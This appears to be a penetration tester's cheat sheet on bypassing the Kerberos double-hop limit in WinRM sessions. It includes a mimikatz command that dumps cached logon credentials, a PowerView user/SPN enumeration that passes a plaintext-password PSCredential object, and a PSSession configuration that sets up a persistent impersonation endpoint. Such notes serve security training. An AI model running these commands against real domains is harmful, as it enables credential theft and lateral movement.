## Double Hop Identification

When access to second-hop resources like the DC or file shares is denied during a WinRM session despite having correct permissions.

Check for the absence of a **Ticket Granting Ticket (TGT)** in the remote session:

```
klist
```

Verify that credentials are not cached in memory for the current user:

```
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

**Gotchas**

- **Network authentication** via WinRM only provides a TGS for the local machine, preventing identity proofing for subsequent hops.

---

## PSCredential Object Bypass

Manual credential injection for tools like PowerView when the session lacks a **stored NTLM hash or TGT**.

Define the credential object to be used for nested commands:

```
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
```

Execute resource-heavy queries by passing the credential object:

```
Get-DomainUser -SPN -Credential $Cred
```

**Edge cases**

- **Interactive RDP** or **PSExec** logins cache the NTLM hash in memory, making this workaround unnecessary.

---

## PSSession Configuration Bypass

Creating a persistent impersonation endpoint on a target host to allow transparent multi-hop authentication from a Windows attack host.

1. Register a named session configuration that runs in the context of the user:

```
Register-PSSessionConfiguration -Name <SERVICE_NAME> -RunAsCredential <DOMAIN>\<USERNAME>
```

2. Reload the WinRM service to apply configuration changes (current session will terminate):

```
Restart-Service WinRM
```

3. Connect using the named configuration to automatically obtain a **PRIMARY TGT**:

```
Enter-PSSession -ComputerName <TARGET_IP> -Credential <DOMAIN>\<USERNAME> -ConfigurationName <SERVICE_NAME>
```

**Dangerous / misconfigured settings**

- **Unconstrained Delegation** enabled on the first hop server allows the TGT to be automatically forwarded and cached, bypassing the double hop problem entirely.

**Gotchas**

- **Linux PowerShell** instances (Parrot/Ubuntu) cannot utilize this method due to Kerberos credential handling limitations.
- **Access denied** if attempting to register configurations via evil-winrm as it requires an **elevated PowerShell terminal**.

> ⚠️ Gap: Register-PSSessionConfiguration requires a GUI-based credential prompt; the technique **fails silently or errors** in non-interactive shells like evil-winrm.